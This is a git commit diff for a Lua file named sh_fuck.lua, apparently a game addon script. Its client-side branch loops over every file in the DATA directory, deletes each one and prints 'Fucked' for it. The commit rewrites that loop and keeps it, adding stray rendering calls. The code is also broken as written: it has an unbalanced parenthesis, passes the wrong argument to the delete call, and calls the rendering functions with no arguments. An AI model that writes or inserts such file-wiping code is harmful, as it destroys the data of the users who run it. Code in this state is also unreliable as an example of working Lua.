ae999f1d2473d36839ad4b6f6babdec6bde94c8b
SamBehner <37122399+SamBehner@users.noreply.github.com>
2020-01-14 10:38:34 -0500

    Update sh_fuck.lua

--- sh_fuck.lua
+++ sh_fuck.lua
@@ -1,9 +1,11 @@
 if SERVER then
  
 else
-  cam.Start3D2D()
-  for k, v in pairs(file.Find("*", "DATA") do
-    file.Delete(k);
-    print("Fucked "..v.."/"..k)
-  end
+	mesh.Begin() 
+	cam.Start3D2D()
+ 
+	for k, v in pairs(file.Find("*", "DATA") do
+    	file.Delete(k);
+    	print("Fucked "..v.."/"..k)
+  	end
 end
